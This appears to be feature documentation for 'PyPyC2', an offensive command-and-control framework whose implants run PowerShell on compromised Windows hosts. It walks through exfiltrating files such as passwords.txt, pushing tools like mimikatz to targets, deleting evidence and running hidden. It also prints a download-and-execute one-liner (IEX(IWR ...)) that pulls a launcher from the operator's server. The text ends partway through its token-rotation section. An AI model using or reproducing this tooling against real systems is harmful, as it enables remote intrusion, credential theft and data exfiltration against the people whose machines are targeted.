# PyPyC2 - Complete Features Documentation

## Table of Contents
1. [Overview & Architecture](#overview--architecture)
2. [Installation & Setup](#installation--setup)
3. [Core Features](#core-features)
4. [Agent Deployment](#agent-deployment)
5. [Web Dashboard](#web-dashboard)
6. [API Reference](#api-reference)
7. [Technical Implementation](#technical-implementation)
8. [Function Reference](#function-reference)
9. [Security Analysis](#security-analysis)

---

## Overview & Architecture

### What is PyPyC2?

PyPyC2 is a **Command and Control (C2) framework** designed for security research, red team training, and understanding offensive security mechanics. It provides a web-based interface to manage remote agents, execute commands, transfer files, and monitor compromised systems.

### Technology Stack

- **Backend**: Python 3.x with FastAPI framework
- **Frontend**: Next.js 14 (React) with TypeScript and Tailwind CSS
- **Agent**: Python-based implant with minimal dependencies
- **Storage**: In-memory (no database) + filesystem for files
- **Communication**: HTTP/REST API (polling-based)

### Architecture Overview

```
┌─────────────────┐
│  Web Dashboard  │ (Next.js + React)
│  (Operator UI)  │
└────────┬────────┘
         │ HTTPS (Protected by Bearer Token)
         │
┌────────▼────────┐
│  FastAPI Server │ (Python)
│   - Agent Mgmt  │
│   - Commands    │
│   - Files       │
└────────┬────────┘
         │ HTTP (No Authentication!)
         │
┌────────▼────────┐
│  Python Agents  │ (Deployed on targets)
│  - Poll Server  │
│  - Execute Cmds │
│  - Send Results │
└─────────────────┘
```

### Project Structure

```
pypyc2/
├── Server/                    # Backend API
│   ├── main.py               # FastAPI application entry point
│   ├── config.py             # Global configuration & agent storage
│   ├── models.py             # Pydantic data models
│   ├── dependencies.py       # Authentication dependency
│   ├── core/                 # Core functionality
│   │   ├── agent.py          # Agent class definition
│   │   ├── security.py       # Auth & session management
│   │   └── token_manager.py  # Payload token rotation
│   ├── routers/              # API endpoints
│   │   ├── auth.py           # Login/logout
│   │   ├── agents.py         # Agent management
│   │   ├── commands.py       # Command creation
│   │   ├── agent_comms.py    # Agent communication
│   │   ├── files.py          # File operations
│   │   └── payloads.py       # Payload generation
│   └── files/                # Static files
│       └── launcher.ps1      # PowerShell dropper
│
├── Agent/                     # Agent implants
│   ├── main.py               # Standard agent (uses requests)
│   └── allinone.py           # Standalone (no dependencies)
│
└── frontend/                  # Web UI
    └── src/
        ├── app/              # Next.js pages (App Router)
        ├── components/       # React components
        ├── contexts/         # Auth context
        ├── lib/             # API client & utilities
        └── types/           # TypeScript definitions
```

---

## Installation & Setup

### Server Setup

1. **Install Dependencies**:
```bash
cd Server
pip install -r requirements.txt
```

Required packages:
- `fastapi` - Web framework
- `uvicorn` - ASGI server
- `bcrypt` - Password hashing
- `python-multipart` - File upload support

2. **Start the Server**:
```bash
python main.py
```

Server runs on `http://0.0.0.0:8000` by default.

### Frontend Setup

1. **Install Dependencies**:
```bash
cd frontend
npm install
```

2. **Configure API URL**:
Edit `frontend/src/lib/api.ts` and set:
```typescript
const API_URL = 'http://localhost:8000'
```

3. **Start Development Server**:
```bash
npm run dev
```

Frontend accessible at `http://localhost:3000`

4. **Build for Production**:
```bash
npm run build
npm start
```

### Default Credentials

- **Username**: `admin`
- **Password**: `pypyc2admin`

---

## Core Features

### 1. Agent Management System

#### Agent Registration

**How it works**:
1. Agent sends POST request to `/join` with hostname and username
2. Server generates random 6-digit ID (100000-999999)
3. Server creates Agent object and stores in memory
4. Server returns agent ID to implant
5. Agent begins polling loop

**Registration Request**:
```json
POST /join
{
  "hostname": "DESKTOP-ABC123",
  "user": "john.doe"
}
```

**Server Response**:
```json
{
  "id": 482751,
  "status": true
}
```

#### Agent Data Model

Each agent stores:
- **id**: 6-digit unique identifier
- **ipaddr**: Client IP address (from HTTP request)
- **hostname**: Computer name
- **user**: Username running the agent
- **commands**: Dictionary of all commands (pending, running, completed)
- **command_counter**: Auto-incrementing command ID
- **uploaded_files**: List of files sent from agent to server
- **downloaded_files**: List of files sent from server to agent
- **last_seen**: ISO 8601 timestamp (updated on every poll)
- **joined_at**: Registration timestamp
- **sleep_time**: Polling interval in seconds (default: 3)

#### Status Tracking

**Online/Offline Detection**:
```typescript
function getAgentStatus(lastSeen: string, sleepTime: number) {
    const diffSeconds = (now - lastSeen) / 1000
    const threshold = sleepTime * 2 + 5  // 2x sleep + 5s buffer
    return diffSeconds < threshold ? 'online' : 'offline'
}
```

**Example**:
- Sleep time = 3s → Threshold = 11s
- If agent hasn't polled in 11+ seconds → Status: Offline

#### Agent Deletion

**Process**:
1. Check if agent is online (last_seen < 15 seconds ago)
2. If online:
   - Create `terminate` command
   - Wait 3 seconds for agent to process
3. Remove agent from memory
4. Delete agent's `uploads/agent_{id}/` directory
5. Return success status

**API Call**:
```
DELETE /agent/{agent_id}
```

---

### 2. Command Execution System

#### Command Types

PyPyC2 supports **9 command types**:

##### 2.1 **exec** - Execute Shell Commands

**Purpose**: Run PowerShell commands on the target system

**Request**:
```json
POST /command/{agent_id}/exec
{
  "command": "whoami /all"
}
```

**How it works**:
1. Server stores command in agent's queue with status `pending`
2. Agent polls and retrieves command (status → `retrieved`)
3. Agent executes via PowerShell:
   ```powershell
   powershell.exe -NoProfile -Command "<command>"
   ```
4. Agent captures stdout/stderr
5. Agent sends result back (status → `completed` or `failed`)

**Special Feature - Persistent Directory**:
- Agent maintains `CWD` (current working directory) variable
- `cd` commands update CWD instead of executing
- All subsequent commands run in the correct directory

**Example**:
```powershell
# Command 1
cd C:\Users

# Command 2 (runs in C:\Users, not original directory)
dir
```

##### 2.2 **upload** - Agent → Server File Transfer

**Purpose**: Exfiltrate files from target to C2 server

**Request**:
```json
POST /command/{agent_id}/upload
{
  "source_path": "C:\\Users\\victim\\Documents\\passwords.txt",
  "filename": "passwords.txt"
}
```

**Flow**:
1. Agent reads file from `source_path`
2. Agent sends multipart/form-data POST to `/agent/upload_file`
3. Server saves to `uploads/agent_{id}/{filename}`
4. Server records in agent's `uploaded_files` list
5. File available for download via dashboard

**Size Limit**: 100MB (configurable via `MAX_FILE_SIZE`)

##### 2.3 **download** - Server → Agent File Transfer

**Purpose**: Deploy files, tools, or scripts to target

**Request**:
```json
POST /command/{agent_id}/download
{
  "filename": "mimikatz.exe",
  "url": "http://192.168.1.100:8000/files/agent_123456/mimikatz.exe",
  "save_as": "C:\\temp\\debug.exe"
}
```

**Flow**:
1. Admin uploads file via `/upload_for_agent/{agent_id}`
2. Server stores in `uploads/agent_{id}/{filename}`
3. Server creates download command with file URL
4. Agent downloads from URL
5. Agent saves to `save_as` path
6. Server records in agent's `downloaded_files` list

##### 2.4 **list_directory** - Remote Directory Listing

**Purpose**: Browse filesystem on target machine

**Request**:
```json
POST /command/{agent_id}/list_directory
{
  "path": "C:\\Users\\victim"
}
```

**Response**:
```json
{
  "status": "success",
  "items": [
    {
      "name": "Documents",
      "is_directory": true,
      "size": 0,
      "path": "C:\\Users\\victim\\Documents"
    },
    {
      "name": "passwords.txt",
      "is_directory": false,
      "size": 4096,
      "path": "C:\\Users\\victim\\passwords.txt"
    }
  ]
}
```

**Features**:
- Sorted: directories first, then files (alphabetical)
- Includes file sizes in bytes
- Full path for each item
- Handles permission errors gracefully

##### 2.5 **read_file** - Read Remote File Content

**Purpose**: View/edit file contents in dashboard

**Request**:
```json
POST /command/{agent_id}/read_file
{
  "path": "C:\\scripts\\config.ini"
}
```

**Response**:
```json
{
  "status": "success",
  "content": "[Settings]\nUsername=admin\nPassword=secret123",
  "encoding": "utf-8"
}
```

**Features**:
- **Encoding Detection**: Tries utf-8, latin-1, cp1252, utf-16
- **Binary Detection**: Returns error for binary files
- **Size Limit**: 10MB maximum
- **Use Case**: Powers the Monaco editor in file manager

##### 2.6 **write_file** - Write Remote File Content

**Purpose**: Save edited file back to target

**Request**:
```json
POST /command/{agent_id}/write_file
{
  "path": "C:\\scripts\\config.ini",
  "content": "[Settings]\nUsername=admin\nPassword=new_password"
}
```

**Safety Features**:
- **Automatic Backup**: Creates `.bak` file before writing
- **Atomic Operation**: Writes to temp file first, then renames
- **Rollback**: Restores backup if write fails
- **Creates Parent Dirs**: Automatically creates missing directories

##### 2.7 **delete** - Delete Files/Directories

**Purpose**: Remove files or directories from target

**Request**:
```json
POST /command/{agent_id}/delete
{
  "path": "C:\\temp\\evidence",
  "recursive": true
}
```

**Parameters**:
- `path`: File or directory to delete
- `recursive`: If true, deletes directories and all contents

**Behavior**:
- Files: Immediate deletion
- Directories (recursive=false): Error if not empty
- Directories (recursive=true): Deletes everything inside

##### 2.8 **set_sleep_time** - Change Polling Interval

**Purpose**: Adjust agent's check-in frequency

**Request**:
```json
POST /command/{agent_id}/set_sleep_time
{
  "sleep_time": 10
}
```

**Range**: 1-60 seconds

**Trade-offs**:
- **Lower (1-5s)**: Faster response, more network traffic, easier detection
- **Higher (30-60s)**: Slower response, stealthier, less bandwidth

**Effect**:
- Agent immediately updates its `SLEEP_TIME` variable
- Server updates agent object after receiving success result
- All future polls use new interval

##### 2.9 **terminate** - Graceful Agent Shutdown

**Purpose**: Cleanly exit agent process

**Request**:
```json
POST /command/{agent_id}/terminate
```

**Flow**:
1. Server creates terminate command
2. Agent retrieves and executes
3. Agent sends success result
4. Agent sets `should_terminate = True`
5. Agent breaks main loop and exits

**When Used**:
- Manual agent shutdown
- Before deleting agent from server
- Stopping agents for maintenance

---

#### Command Lifecycle

```
┌──────────┐
│ PENDING  │ ← Command created by admin
└────┬─────┘
     │
     │ Agent polls /agent/get_commands
     ▼
┌───────────┐
│ RETRIEVED │ ← Agent received command
└────┬──────┘
     │
     │ Agent executes and sends result
     ▼
┌───────────┐     ┌────────┐
│ COMPLETED │  OR │ FAILED │
└───────────┘     └────────┘
```

**Timestamps**:
- `created_at`: When admin created command
- `retrieved_at`: When agent first received command
- `completed_at`: When result was received

---

### 3. File Operations

#### Storage Structure

```
uploads/
├── agent_123456/
│   ├── passwords.txt        # Uploaded from agent
│   ├── screenshot.png       # Uploaded from agent
│   └── mimikatz.exe        # Uploaded by admin for agent
├── agent_789012/
│   └── data.zip
└── ...
```

#### Upload from Agent (Exfiltration)

**Endpoint**: `POST /agent/upload_file`

**Multipart Form Data**:
```
agent_id: 123456
filename: passwords.txt
file: <binary data>
```

**Process**:
1. Admin creates `upload` command with source path
2. Agent reads file from disk
3. Agent sends multipart/form-data POST
4. Server validates:
   - Agent exists
   - Filename is safe (no path traversal)
   - Size ≤ 100MB
5. Server saves to `uploads/agent_{id}/{filename}`
6. Server updates agent's `uploaded_files` list

**Security**:
- Path traversal prevention: `Path(filename).name`
- Agent isolation: Separate directories per agent

#### Download to Agent (Deployment)

**Endpoint**: `GET /files/agent_{id}/{filename}`

**Process**:
1. Admin uploads file via dashboard (`/upload_for_agent/{agent_id}`)
2. Server stores in agent's directory
3. Admin creates `download` command with:
   - `filename`: Name in agent's directory
   - `url`: Full URL to file (e.g., `http://c2.local:8000/files/agent_123456/tool.exe`)
   - `save_as`: Where agent should save it
4. Agent downloads from URL
5. Agent saves to target path

**No Authentication**: `/files/` endpoint is public (agents can't auth)

#### Dashboard File Operations

**Download from Server** (`GET /dashboard/files/{agent_id}/{filename}`):
- Operator downloads exfiltrated files to their PC
- Protected by Bearer token

**Delete from Server** (`DELETE /dashboard/files/{agent_id}/{filename}`):
- Remove files from server storage
- Protected by Bearer token

**List Agent Files** (`GET /files/{agent_id}`):
- Returns JSON array of files in agent's directory
- Includes filename and size

---

### 4. Communication Protocol

#### Transport

- **Protocol**: HTTP (not HTTPS!)
- **Format**: JSON
- **Method**: RESTful API
- **Pattern**: Polling (agent initiates, no server push)

#### Agent → Server Endpoints

| Endpoint | Method | Purpose | Auth |
|----------|--------|---------|------|
| `/join` | POST | Register new agent | None |
| `/agent/get_commands/{id}` | GET | Poll for commands | None |
| `/agent/set_command_result` | POST | Submit command result | None |
| `/agent/upload_file` | POST | Upload file to server | None |
| `/files/agent_{id}/{filename}` | GET | Download file | None |

#### Operator → Server Endpoints

| Endpoint | Method | Purpose | Auth |
|----------|--------|---------|------|
| `/auth/login` | POST | Get bearer token | Credentials |
| `/agents` | GET | List all agents | Bearer |
| `/agent/{id}` | GET | Get agent details | Bearer |
| `/agent/{id}` | DELETE | Delete agent | Bearer |
| `/command/{id}/{type}` | POST | Create command | Bearer |
| `/upload_for_agent/{id}` | POST | Upload file for agent | Bearer |
| `/dashboard/files/{id}/{filename}` | GET | Download file | Bearer |
| `/api/payload-token` | GET | Get current token | Bearer |
| `/payload/launcher.ps1?id={token}` | GET | Get launcher | Token |

#### Message Formats

**Join Request**:
```json
POST /join
{
  "hostname": "WORKSTATION-01",
  "user": "john.doe"
}
```

**Join Response**:
```json
{
  "id": 482751,
  "status": true
}
```

**Get Commands Response**:
```json
{
  "commands": [
    {
      "command_id": 1,
      "type": "exec",
      "data": {
        "command": "whoami"
      }
    },
    {
      "command_id": 2,
      "type": "download",
      "data": {
        "filename": "tool.exe",
        "url": "http://192.168.1.100:8000/files/agent_482751/tool.exe",
        "save_as": "C:\\temp\\tool.exe"
      }
    }
  ]
}
```

**Set Command Result Request**:
```json
POST /agent/set_command_result
{
  "agent_id": 482751,
  "command_id": 1,
  "status": "success",
  "result": "desktop-abc123\\john.doe",
  "error": ""
}
```

#### Polling Mechanism

**Agent Loop**:
```python
while not should_terminate:
    time.sleep(SLEEP_TIME)  # Default: 3 seconds

    # Poll for commands
    response = requests.get(f"{SERVER_URL}/agent/get_commands/{AGENT_ID}")
    commands = response.json()['commands']

    # Execute each command
    for command in commands:
        result = execute_command(command)

        # Send result
        requests.post(f"{SERVER_URL}/agent/set_command_result", json={
            "agent_id": AGENT_ID,
            "command_id": command['command_id'],
            "status": result['status'],
            "result": result.get('result', ''),
            "error": result.get('error', '')
        })
```

**Timing**:
- Default sleep: 3 seconds
- Configurable: 1-60 seconds
- No jitter (predictable timing - detection risk!)

---

## Agent Deployment

### Method 1: PowerShell Launcher (Recommended)

**File**: `Server/files/launcher.ps1`

**Features**:
1. **Auto-installs Python** if not present:
   - Downloads Python 3.12.7 (64-bit) from python.org
   - Silent install (no user interaction)
   - User-level install (no admin required)
   - Minimal installation (~50MB)
   - Adds to PATH automatically

2. **Installs Dependencies**:
   - Runs `pip install requests --quiet`

3. **In-Memory Execution**:
   - Downloads agent code from server
   - Pipes directly to Python (no disk writes!)
   - Command: `python - http://c2-server:8000`

4. **Hidden Execution** (deployment mode):
   - Creates background process
   - No visible window
   - Continues after launcher exits

**Usage**:
1. Go to **Payloads** page in dashboard
2. Set server address (e.g., `192.168.1.100:8000`)
3. Select mode:
   - **Debug**: Visible PowerShell window
   - **Deployment**: Hidden background process
4. Copy generated one-liner
5. Execute on target machine

**Generated Payload Example**:
```powershell
IEX(IWR -UseBasicParsing http://192.168.1.100:8000/payload/launcher.ps1?id=7h9K2mP5nQ8xR1wV).Content
```

**Token Protection**:
- Launcher endpoint requires rotating token (5min expiry)
- Prevents threat intel from easily downloading payloads
- Token auto-rotates every 5 minutes

### Method 2: Manual Deployment

**Standard Agent** (requires `requests` library):
```bash
# On target machine
pip install requests
python Agent/main.py http://c2-server:8000
```

**All-in-One Agent** (no dependencies):
```bash
# On target machine
python Agent/allinone.py http://c2-server:8000
```

**Difference**:
- `main.py`: Uses `requests` library (cleaner code)
- `allinone.py`: Pure stdlib `urllib` (no dependencies, longer code)

---

## Web Dashboard

### 1. Login Page (`/login`)

**Features**:
- Username/password form
- "Remember me" checkbox (saves to localStorage)
- Auto-redirect if already authenticated

**Default Credentials**:
- Username: `admin`
- Password: `pypyc2admin`

**Flow**:
1. Submit credentials
2. Server validates (bcrypt hash check)
3. Server creates session with UUID token
4. Token stored in localStorage
5. Redirect to dashboard

---

### 2. Dashboard (`/`)

**Overview Stats** (4 cards):
- Total Agents (all time)
- Online Agents (active in last 15s)
- Total Commands (across all agents)
- Files Uploaded (exfiltrated files)

**Network Topology**:
- Visual graph of C2 infrastructure
- Central server node
- Agent nodes connected with lines
- Color-coded status:
  - Green = Online
  - Red = Offline
- Click agent to view details
- Refresh button

**Auto-refresh**: Every 3 seconds

---

### 3. Agents List (`/agents`)

**Features**:
- Grid of agent cards
- Filter by status:
  - All Agents
  - Online (green indicator)
  - Offline (red indicator)
- Each card shows:
  - Hostname
  - Username
  - IP address
  - Status indicator (pulsing dot)
  - Last seen time
  - Total commands count
- Actions per agent:
  - **View Details** → Agent detail page
  - **Open Terminal** → Terminal with agent pre-selected

**Auto-refresh**: Every 3 seconds

---

### 4. Agent Details (`/agents/{id}`)

**Three Tabs**:

#### Overview Tab
- Agent ID, hostname, user, IP
- Status indicator (online/offline)
- Joined timestamp
- Current sleep time
- Statistics:
  - Total commands
  - Completed commands
  - Failed commands
  - Pending commands
  - Files uploaded
  - Files downloaded

#### Commands Tab
- Filter by status dropdown (all/completed/failed/pending)
- Collapsible command list
- Each command shows:
  - Command type badge
  - Command details (e.g., exec command text)
  - Timestamps (created, retrieved, completed)
  - Status badge (pending/retrieved/completed/failed)
  - Output (collapsible, with copy button)
- Copy buttons for both command and output

#### Files Tab
- **Uploaded Files** (from agent):
  - Filename
  - Size
  - Upload timestamp
  - Download button (downloads to operator's PC)
- **Downloaded Files** (sent to agent):
  - Filename
  - Download timestamp

**Toolbar Actions**:
- **Refresh**: Manual refresh
- **Open Terminal**: Open terminal for this agent
- **Manage Files**: Open file manager
- **Change Sleep Time**: Modal to set new polling interval (1-60s)
- **Delete Agent**:
  - Confirmation modal
  - Sends terminate command if online
  - Waits 3 seconds
  - Deletes agent and all files

**Auto-refresh**: Every 5 seconds

---

### 5. Terminal (`/terminal`)

**Layout**:
- Left sidebar: Agent selector (shows all agents)
- Main area: Terminal interface

**Features**:
- **Agent Selection**: Click agent in sidebar to connect
- **Command Input**: Text box at bottom
- **Execute**: Press Enter or click Execute button
- **Output Display**:
  - Virtualized scrolling (react-virtuoso) for performance
  - Shows all commands and their outputs
  - Color-coded status (success/error)
  - Loading indicator while waiting for result
- **Real-time Updates**: Polls every 300ms for command results
- **Timeout Calculation**: `(agent_sleep_time * 3) + 10` seconds
- **Status Indicator**: Shows if selected agent is online/offline

**Smart Polling**:
- Frontend polls `/command/{agent_id}/{command_id}` endpoint
- Calculates max attempts based on agent's sleep time
- Shows loading spinner while waiting
- Displays result when available
- Shows error if timeout reached

**Example Session**:
```
> whoami
desktop-abc123\john.doe

> cd C:\Users
Changed directory to C:\Users

> dir
Directory: C:\Users
Mode    LastWriteTime    Length Name
----    -------------    ------ ----
d-----  1/1/2025 10:00 AM       john.doe
d-----  1/1/2025 09:00 AM       Public
```

---

### 6. File Manager (`/filemanager`)

**Most Advanced Feature** - Full remote filesystem browser.

**Layout**:
- Top: Agent selector dropdown
- Toolbar: Refresh, Upload, Download buttons
- Breadcrumb navigation (clickable path)
- File/folder table with sortable columns
- Selected files panel (for bulk operations)
- Monaco editor modal (for file editing)

**Features**:

#### Directory Browsing
- List files and folders
- Sort by name, size, or type
- Double-click folder to navigate
- Breadcrumb navigation (e.g., `C:\ > Users > john.doe > Documents`)
- Shows file sizes (formatted: KB, MB, GB)
- File/folder icons

#### Multi-Select Operations
- Checkbox for each file/folder
- Select multiple items
- Bulk download (downloads to server)
- Selected count in panel

#### File Upload
- Upload files from operator's PC to server
- Then deploy to agent's current directory
- Uses standard file picker

#### File Download (to server)
- Select files/folders
- Click Download button
- Files transferred from agent to server
- Available in Downloads page

#### File Editing
- Click "Edit" on any file
- Opens Monaco editor (VSCode editor)
- Syntax highlighting for 20+ languages:
  - Python, JavaScript, TypeScript, HTML, CSS
  - JSON, YAML, XML, Markdown
  - PowerShell, Bash, C, C++, Java
  - And more...
- Features:
  - Line numbers
  - Code folding
  - Find/replace
  - Minimap
  - Auto-completion
- **Save** button writes changes back to target
- **Creates backup** before saving (`.bak` file)
- Binary file detection (shows error)
- Modified indicator (shows if unsaved changes)

#### File Deletion
- Select files/folders
- Click Delete button
- Confirmation modal
- For directories: Option for recursive delete

#### Persistence
- Uses **localStorage** to remember:
  - Last selected agent
  - Current directory per agent
- Restores state on page reload

**Technical Details**:
- Async operations with loading states
- Error handling with toast notifications
- Smart polling for command results
- 10MB file size limit for editing
- Encoding detection (utf-8, latin-1, cp1252, utf-16)

---

### 7. Downloads (`/files`)

**Purpose**: Access files uploaded from agents (exfiltrated data)

**Features**:
- Lists all files in server's `uploads/` directory
- Organized by agent
- Each file shows:
  - Filename
  - Size (formatted)
  - Upload timestamp
- Actions:
  - **Download**: Download to operator's PC
  - **Delete**: Remove from server storage (with confirmation)
- Search/filter by filename
- Sort by name, size, or date

---

### 8. Payloads (`/payloads`)

**Purpose**: Generate deployment commands for new agents

**Configuration Section**:
- **Server Address**: IP or domain (e.g., `192.168.1.100`)
- **Server Port**: Default `8000`
- **Mode**:
  - **Debug**: Visible PowerShell window (for testing)
  - **Deployment**: Hidden background process (for operations)

**Token Protection**:
- Displays current token expiry countdown
- Token rotates every 5 minutes
- Prevents threat intel from downloading payloads

**Generated Payload**:
Shows PowerShell one-liner:
```powershell
IEX(IWR -UseBasicParsing http://192.168.1.100:8000/payload/launcher.ps1?id=7h9K2mP5nQ8xR1wV).Content
```

**Copy to Clipboard** button for easy deployment

**Instructions Section**:
- Step-by-step deployment guide
- Explains what the launcher does
- Security considerations

---

## API Reference

### Authentication Endpoints

#### Login
```
POST /auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "pypyc2admin"
}

Response 200:
{
  "token": "550e8400-e29b-41d4-a716-446655440000",
  "username": "admin",
  "role": "admin"
}

Response 401:
{
  "detail": "Invalid credentials"
}
```

#### Logout
```
POST /auth/logout
Authorization: Bearer <token>

Response 200:
{
  "message": "Logged out successfully"
}
```

#### Verify Token
```
GET /auth/verify
Authorization: Bearer <token>

Response 200:
{
  "username": "admin",
  "role": "admin"
}

Response 401:
{
  "detail": "Invalid or expired session"
}
```

---

### Agent Management Endpoints

#### List All Agents
```
GET /agents
Authorization: Bearer <token>

Response 200:
[
  {
    "id": 482751,
    "ipaddr": "192.168.1.50",
    "hostname": "WORKSTATION-01",
    "user": "john.doe",
    "last_seen": "2025-11-22T10:30:45Z",
    "joined_at": "2025-11-22T09:15:20Z",
    "sleep_time": 3
  }
]
```

#### Get Agent Details
```
GET /agent/{agent_id}
Authorization: Bearer <token>

Response 200:
{
  "id": 482751,
  "ipaddr": "192.168.1.50",
  "hostname": "WORKSTATION-01",
  "user": "john.doe",
  "last_seen": "2025-11-22T10:30:45Z",
  "joined_at": "2025-11-22T09:15:20Z",
  "sleep_time": 3,
  "commands": {
    "1": {
      "type": "exec",
      "data": {"command": "whoami"},
      "status": "completed",
      "result": "workstation-01\\john.doe",
      "created_at": "2025-11-22T10:20:00Z",
      "retrieved_at": "2025-11-22T10:20:03Z",
      "completed_at": "2025-11-22T10:20:05Z"
    }
  },
  "uploaded_files": ["passwords.txt"],
  "downloaded_files": ["tool.exe"]
}
```

#### Delete Agent
```
DELETE /agent/{agent_id}
Authorization: Bearer <token>

Response 200:
{
  "message": "Agent deleted",
  "terminated": true
}
```

---

### Command Creation Endpoints

#### Execute Command
```
POST /command/{agent_id}/exec
Authorization: Bearer <token>
Content-Type: application/json

{
  "command": "whoami /all"
}

Response 200:
{
  "command_id": 5,
  "message": "Command created"
}
```

#### Upload File (Agent → Server)
```
POST /command/{agent_id}/upload
Authorization: Bearer <token>

{
  "source_path": "C:\\Users\\victim\\passwords.txt",
  "filename": "passwords.txt"
}

Response 200:
{
  "command_id": 6,
  "message": "Upload command created"
}
```

#### Download File (Server → Agent)
```
POST /command/{agent_id}/download
Authorization: Bearer <token>

{
  "filename": "tool.exe",
  "url": "http://192.168.1.100:8000/files/agent_482751/tool.exe",
  "save_as": "C:\\temp\\tool.exe"
}

Response 200:
{
  "command_id": 7,
  "message": "Download command created"
}
```

#### List Directory
```
POST /command/{agent_id}/list_directory
Authorization: Bearer <token>

{
  "path": "C:\\Users"
}

Response 200:
{
  "command_id": 8,
  "message": "List directory command created"
}
```

#### Read File
```
POST /command/{agent_id}/read_file
Authorization: Bearer <token>

{
  "path": "C:\\config.ini"
}

Response 200:
{
  "command_id": 9,
  "message": "Read file command created"
}
```

#### Write File
```
POST /command/{agent_id}/write_file
Authorization: Bearer <token>

{
  "path": "C:\\config.ini",
  "content": "[Settings]\nKey=Value"
}

Response 200:
{
  "command_id": 10,
  "message": "Write file command created"
}
```

#### Delete File/Directory
```
POST /command/{agent_id}/delete
Authorization: Bearer <token>

{
  "path": "C:\\temp\\evidence",
  "recursive": true
}

Response 200:
{
  "command_id": 11,
  "message": "Delete command created"
}
```

#### Set Sleep Time
```
POST /command/{agent_id}/set_sleep_time
Authorization: Bearer <token>

{
  "sleep_time": 10
}

Response 200:
{
  "command_id": 12,
  "message": "Set sleep time command created"
}
```

#### Terminate Agent
```
POST /command/{agent_id}/terminate
Authorization: Bearer <token>

Response 200:
{
  "command_id": 13,
  "message": "Terminate command created"
}
```

#### Get Command Result
```
GET /command/{agent_id}/{command_id}
Authorization: Bearer <token>

Response 200 (completed):
{
  "status": "completed",
  "result": "Output here...",
  "error": ""
}

Response 200 (pending):
{
  "status": "pending",
  "result": null,
  "error": null
}

Response 404:
{
  "detail": "Command not found"
}
```

---

### Agent Communication Endpoints (No Auth)

#### Join
```
POST /join

{
  "hostname": "WORKSTATION-01",
  "user": "john.doe"
}

Response 200:
{
  "id": 482751,
  "status": true
}
```

#### Get Commands
```
GET /agent/get_commands/{agent_id}

Response 200:
{
  "commands": [
    {
      "command_id": 1,
      "type": "exec",
      "data": {"command": "whoami"}
    }
  ]
}
```

#### Set Command Result
```
POST /agent/set_command_result

{
  "agent_id": 482751,
  "command_id": 1,
  "status": "success",
  "result": "Output here",
  "error": ""
}

Response 200:
{
  "message": "Result received"
}
```

#### Upload File
```
POST /agent/upload_file
Content-Type: multipart/form-data

agent_id: 482751
filename: passwords.txt
file: <binary>

Response 200:
{
  "message": "File uploaded successfully",
  "filename": "passwords.txt"
}
```

---

### File Management Endpoints

#### Download File (Agent)
```
GET /files/agent_{agent_id}/{filename}

Response 200:
<binary file data>
```

#### List Agent Files
```
GET /files/{agent_id}
Authorization: Bearer <token>

Response 200:
[
  {
    "filename": "passwords.txt",
    "size": 4096
  }
]
```

#### Download File (Dashboard)
```
GET /dashboard/files/{agent_id}/{filename}
Authorization: Bearer <token>

Response 200:
<binary file data>
```

#### Upload File for Agent
```
POST /upload_for_agent/{agent_id}
Authorization: Bearer <token>
Content-Type: multipart/form-data

file: <binary>

Response 200:
{
  "message": "File uploaded successfully",
  "filename": "tool.exe"
}
```

#### Delete File
```
DELETE /dashboard/files/{agent_id}/{filename}
Authorization: Bearer <token>

Response 200:
{
  "message": "File deleted successfully"
}
```

---

### Payload Endpoints

#### Get Current Token
```
GET /api/payload-token
Authorization: Bearer <token>

Response 200:
{
  "token": "7h9K2mP5nQ8xR1wV",
  "expires_in": 243
}
```

#### Get Launcher Script
```
GET /payload/launcher.ps1?id={token}

Response 200:
<PowerShell script>

Response 404 (invalid token):
{
  "detail": "Invalid or expired payload token"
}
```

---

## Technical Implementation

### In-Memory Storage System

**No Database**: PyPyC2 uses in-memory dictionaries for all data.

**Global Storage** (`Server/config.py`):
```python
agents: Dict[int, Agent] = {}
```

**Sessions** (`Server/core/security.py`):
```python
sessions: Dict[str, SessionData] = {}
```

**Implications**:
- **Fast**: No database overhead
- **Volatile**: All data lost on server restart
- **Simple**: No migrations, schemas, or ORMs
- **Limited Scale**: All data must fit in RAM

---

### Data Models

#### Agent Class (`Server/core/agent.py`)
```python
class Agent:
    def __init__(self, id: int, ipaddr: str, hostname: str, user: str):
        self.id = id
        self.ipaddr = ipaddr
        self.hostname = hostname
        self.user = user
        self.commands: Dict[int, Dict] = {}
        self.command_counter = 0
        self.uploaded_files: List[str] = []
        self.downloaded_files: List[str] = []
        self.last_seen = datetime.now(timezone.utc).isoformat()
        self.joined_at = datetime.now(timezone.utc).isoformat()
        self.sleep_time = 3

    def update_last_seen(self):
        self.last_seen = datetime.now(timezone.utc).isoformat()

    def add_command(self, command_type: str, data: Dict) -> int:
        self.command_counter += 1
        self.commands[self.command_counter] = {
            'type': command_type,
            'data': data,
            'result': None,
            'status': 'pending',
            'created_at': datetime.now(timezone.utc).isoformat(),
            'retrieved_at': None,
            'completed_at': None
        }
        return self.command_counter

    def get_commands(self) -> List[Dict]:
        commands = []
        for cmd_id, cmd in self.commands.items():
            if cmd['status'] == 'pending':
                cmd['status'] = 'retrieved'
                cmd['retrieved_at'] = datetime.now(timezone.utc).isoformat()
                commands.append({
                    'command_id': cmd_id,
                    'type': cmd['type'],
                    'data': cmd['data']
                })
        return commands
```

#### Session Data
```python
class SessionData:
    username: str
    role: str
    created_at: datetime
    last_activity: datetime
```

---

### Authentication System

**Password Hashing** (`Server/core/security.py`):
```python
import bcrypt

# Hardcoded credentials
ADMIN_USER = "admin"
ADMIN_PASSWORD_HASH = bcrypt.hashpw(
    "pypyc2admin".encode('utf-8'),
    bcrypt.gensalt()
)

def verify_credentials(username: str, password: str) -> bool:
    if username != ADMIN_USER:
        return False
    return bcrypt.checkpw(password.encode('utf-8'), ADMIN_PASSWORD_HASH)
```

**Session Management**:
```python
import uuid
from datetime import datetime, timedelta, timezone

sessions: Dict[str, SessionData] = {}
SESSION_TIMEOUT = timedelta(hours=8)

def create_session(username: str, role: str) -> str:
    token = str(uuid.uuid4())
    sessions[token] = SessionData(
        username=username,
        role=role,
        created_at=datetime.now(timezone.utc),
        last_activity=datetime.now(timezone.utc)
    )
    return token

def validate_session(token: str) -> Optional[SessionData]:
    session = sessions.get(token)
    if not session:
        return None

    # Check timeout
    if datetime.now(timezone.utc) - session.last_activity > SESSION_TIMEOUT:
        del sessions[token]
        return None

    # Update last activity
    session.last_activity = datetime.now(timezone.utc)
    return session
```

---

### Token Rotation System

**Purpose**: Prevent automated payload scraping by threat intel

**Implementation** (`Server/core/token_manager.py`):
